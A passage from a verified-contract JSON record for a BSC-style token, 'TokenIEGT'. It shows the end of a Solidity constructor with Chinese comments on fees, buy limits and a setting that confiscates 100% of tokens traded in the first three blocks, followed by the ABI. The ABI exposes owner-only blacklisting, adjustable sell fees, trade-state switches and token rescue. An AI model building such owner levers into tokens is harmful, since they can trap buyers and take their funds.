\u56de\u6d41 0%\r\n        feeBurnBuy = 0; // \u9500\u6bc1 0%\r\n        // \u5356\u51fa\u8d39\u7528\r\n        feeMarketingSell = 400; // \u8425\u9500 4%\r\n        feeLiquiditySell = 200; // \u56de\u6d41 2%\r\n        feeBurnSell = 0; // \u9500\u6bc1 0%\r\n        // \u8f6c\u8d26\u8d39\u7528\r\n        feeTransferAll = 0; // \u8f6c\u8d26\u6263\u96640%\r\n        // \u9650\u8d2d\r\n        bool _isLimit = false; // \u662f\u5426\u9650\u8d2d\r\n        if (_isLimit)\r\n            super.__Limit_init(\r\n                _totalSupply / 250, // \u9650\u4e70\u6570\u91cf 20 \u4e2a\r\n                _totalSupply / 250, // \u9650\u5356\u6570\u91cf 20 \u4e2a\r\n                _totalSupply / 250 // \u9650\u6301\u6709\u6570\u91cf 20 \u4e2a\r\n            );\r\n        // \u6740\u533a\u5757\u673a\u5668\u4eba\r\n        super.setSurprise(\r\n            10000, // \u6263\u9664 100% \u4ee3\u5e01, \u5f53\u624b\u7eed\u8d39\r\n            3 // \u6740\u524d\u4e09\u4e2a\u533a\u5757, \u8fd9\u51e0\u4e2a\u533a\u5757\u666e\u901a\u7528\u6237\u65e0\u6cd5\u8fdb\u5165, \u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u8fdb\u5165\r\n        );\r\n        super.__Token_init(_totalSupply, _marketing, _receive, _usdt);\r\n        setSwapTokensAt(0.0005 ether); // \u8bbe\u7f6e\u7d2f\u79ef\u5230 1% \u4e2a\u4ee3\u5e01\u5f00\u59cb\u5151\u6362\u624b\u7eed\u8d39, \u8282\u7ea6gas\r\n        // \u9632\u6b62\u5356\u7a7a\uff0c\u8d26\u6237\u9884\u7559\u975e\u5e38\u5c11\u7684\u4ee3\u5e01\uff0c\u4ee5\u4fdd\u7559\u6301\u5e01\u6570\r\n        amountKeep = 0.0001 ether; // \u7559\u4e0b 0.0001 \u4ee3\u5e01\uff0c\u4fdd\u7559\u6301\u5e01\u4eba\u6570\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TokenB\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_TokenStation\",\"outputs\":[{\"internalType\":\"contract TokenStation\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"amount\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdropMulti\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountKeep\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"blackListMap\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calcBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"canSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decreaseRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquiditySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTransferAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountDesire\",\"type\":\"uint256\"}],\"name\":\"getPrice4USDT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isBlackList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"isExcludes\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimited\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kb\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUpdateTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refreshFeeAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rescueLossToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"}],\"name\":\"rescueLossTokenAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reuseLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"}],\"name\":\"setBlackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"user\",\"type\":\"address[]\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"}],\"name\":\"setBlackLists\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExclude\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setExcludes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquidityBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnBuy\",\"type\":\"uint256\"}],\"name\":\"setFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_feeMarketingTo\",\"type\":\"address\"}],\"name\":\"setFeeMarketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeMarketingSell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeLiquiditySell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeBurnSell\",\"type\":\"uint256\"}],\"name\":\"setFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"setFeeTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"LimitBuy_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitSell_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LimitHold_\",\"type\":\"uint256\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_kn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_kb\",\"type\":\"uint256\"}],\"name\":\"setSurprise\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"s\",\"type\":\"uint256\"}],\"name\":\"setTradeState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"surpAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSplit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"thePrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TokenIEGT", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8a8b6737a79ec6e95785257402b83fd683b4de0f122cddd9f69a7f983f65ebcb"}